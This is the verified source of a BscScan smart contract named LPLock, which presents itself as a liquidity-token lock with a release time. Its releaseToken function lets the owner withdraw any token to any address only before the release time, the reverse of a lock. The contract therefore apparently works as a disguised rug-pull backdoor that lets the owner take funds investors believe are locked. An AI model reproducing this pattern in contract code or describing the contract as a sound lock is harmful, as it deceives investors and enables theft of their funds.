/**
 *Submitted for verification at BscScan.com on 2022-05-07
*/

// SPDX-License-Identifier: MIT

interface IERC20 {
  
    function transfer(address recipient, uint256 amount) external returns (bool);
    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

}

pragma solidity ^0.8.0;

contract LPLock {

    address public _tokenAddress;
    
    address private _owner;

    uint256 public immutable _releaseTime;

    constructor(uint256 releaseTime) {
        _releaseTime = releaseTime;
        _owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(_owner == msg.sender, "Caller is not the owner");
        _;
    }

    function setToken(address tokenAddress) external onlyOwner() {
        _tokenAddress = tokenAddress;
    }
    
    function releaseToken(address tokenAddress, address recipient, uint256 amount) external onlyOwner() {
        require(block.timestamp < _releaseTime, "No release time");
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(recipient, amount), "Token transfer failed");
    }

}